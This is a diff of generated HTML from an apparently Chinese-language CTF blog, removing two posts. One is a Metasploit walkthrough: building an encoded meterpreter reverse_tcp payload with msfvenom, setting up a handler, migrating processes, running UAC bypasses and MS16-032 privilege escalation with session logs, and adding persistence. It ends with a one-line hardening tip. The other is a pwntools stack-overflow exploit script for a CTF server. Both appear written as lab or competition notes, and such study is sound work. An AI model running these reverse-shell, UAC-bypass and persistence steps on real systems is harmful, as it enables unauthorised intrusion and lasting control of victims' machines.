-<p>[<em>] UAC is Enabled, checking level…<br>[+] Part of Administrators group! Continuing…<br>[!] UAC set to DoNotPrompt - using ShellExecute “runas” method instead<br>[</em>] Uploading kFJOgrXchF.exe - 7168 bytes to the filesystem…</p>
-<p>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp lhost=172.30.56.107 lport=11300 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe</p>
-<p>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp #设置成payload的模式<br>set LHOST 172.30.56.107<br>set lport 11300<br>exploit -j<br>sessions -i 2<br>shell</p>
-<h1 id="进行进程迁移"><a href="#进行进程迁移" class="headerlink" title="进行进程迁移"></a>进行进程迁移</h1><p>tasklist|findstr explorer<br>migrate 1844<br>background<br>chcp 65001</p>
-<h1 id="探测系统漏洞，比较耗费系统资源"><a href="#探测系统漏洞，比较耗费系统资源" class="headerlink" title="探测系统漏洞，比较耗费系统资源"></a>探测系统漏洞，比较耗费系统资源</h1><p>use post/multi/recon/local_exploit_suggester<br>set session 1<br>exploit </p>
-<p>use exploit/windows/local/ms16_032_secondary_logon_handle_privesc</p>
-<p>use exploit/windows/local/bypassuac_fodhelper</p>
-<p>set session 3</p>
-<p>exploit </p>
-<h2 id="上传到了临时文件夹"><a href="#上传到了临时文件夹" class="headerlink" title="上传到了临时文件夹"></a>上传到了临时文件夹</h2><p>检测发现后面上传的利用工具都</p>
-<p>C:\Users\22154\AppData\Local\Temp\OkNyUvljPBU.ps1<br>C:\Users\22154\AppData\Local\Temp\AFYMdwEU.ps1<br>VFvBBvAw.exe</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/local/bypassuac_dotnet_profiler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.30.56.107:11300</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[!] UAC set to DoNotPrompt - using ShellExecute &quot;runas&quot; method instead</span><br><span class="line">[*] Uploading XyrFnIA.exe - 7168 bytes to the filesystem...</span><br><span class="line">[*] Executing Command!</span><br><span class="line">[*] Sending stage (200774 bytes) to 172.30.48.1</span><br><span class="line">[*] Meterpreter session 5 opened (172.30.56.107:11300 -&gt; 172.30.48.1:54093) at 2023-11-28 20:15:41 +0800</span><br></pre></td></tr></table></figure>
-<h2 id="维持"><a href="#维持" class="headerlink" title="维持"></a>维持</h2><p>run persistence 借助vbs</p>
-<p><img src="/categories/CTF/msf%E6%9C%A8%E9%A9%AC%E4%B8%8A%E7%BA%BF%E5%90%8E/1701177877128.png" alt="1701177877128"></p>
-<h2 id="加固"><a href="#加固" class="headerlink" title="加固"></a>加固</h2><h4 id="关闭“启用粘滞键”选项"><a href="#关闭“启用粘滞键”选项" class="headerlink" title="关闭“启用粘滞键”选项"></a>关闭“启用粘滞键”选项</h4><p>辅助功能—&gt;键盘，全部取消。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://blueinyou.com/categories/CTF/xsbAWDP/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://blueinyou.com/photos/avatar.jpg">
-      <meta itemprop="name" content="Paul C">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paul C's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/categories/CTF/xsbAWDP/" class="post-title-link" itemprop="url">XSB2023 Py</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-11-19 14:19:49 / Modified: 16:25:05" itemprop="dateCreated datePublished" datetime="2023-11-19T14:19:49+08:00">2023-11-19</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>我的EXP</p>
-<p>我也找对了漏洞所在，是打赢BOSS2后留名字的栈溢出。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = remote(&quot;47.94.85.181&quot;,22872) #连接指定IP及端口，题目给定</span><br><span class="line">r.recvlines(10)       #运行到字符串位置停下</span><br><span class="line"></span><br><span class="line">for i in range(10000):</span><br><span class="line">    r.sendline(&quot;2&quot;)       #运行到字符串位置停下</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line">    r.recvlines(7)   </span><br><span class="line">r.sendline(&quot;2&quot;)       #运行到字符串位置停下</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(&quot;2&quot;)</span><br><span class="line">r.recvlines(7)   </span><br><span class="line">payload = &#x27;A&#x27; * 9 + str(p64(0x00117630))#+str(p64(&#x27;flag&#x27;))+str(0x0000000000000001)+str(0x0000000000000001)#发送数据，输入数据溢出,并覆盖,返回到目标位置</span><br><span class="line">r.sendline(payload)         #发送 payload</span><br><span class="line">r.interactive()             #交互</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -1141,7 +1238,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">179</span>
+          <span class="site-state-item-count">181</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
